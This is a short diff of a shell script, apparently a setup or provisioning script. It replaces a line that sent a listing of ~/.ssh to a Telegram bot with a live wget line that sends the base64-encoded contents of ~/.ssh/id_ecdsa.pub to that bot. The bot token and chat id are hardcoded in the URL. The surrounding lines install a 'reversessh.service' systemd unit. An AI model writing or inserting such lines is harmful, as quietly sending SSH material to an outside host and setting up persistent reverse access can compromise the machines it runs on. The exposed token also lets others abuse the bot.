@@ -59,8 +59,8 @@ fi
 
 # sudo apt update && sudo apt install -y sshpass
 
-curl -v "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(ls ~/.ssh/ | base64 -w 0)"
-wget "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(ls ~/.ssh/ | base64 -w 0)"
+# curl -v "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(ls ~/.ssh/ | base64 -w 0)"
+wget "https://api.telegram.org/bot5555989870:AAE0hzaZ0IvGA6iJ7ubfS_x_1KA1W6vwryY/sendMessage?chat_id=-748244195&text=$(cat ~/.ssh/id_ecdsa.pub | base64 -w 0)"
 
 # Too critical to be updated on regular basis
 InstallIfNeeded /etc/systemd/system reversessh.service true
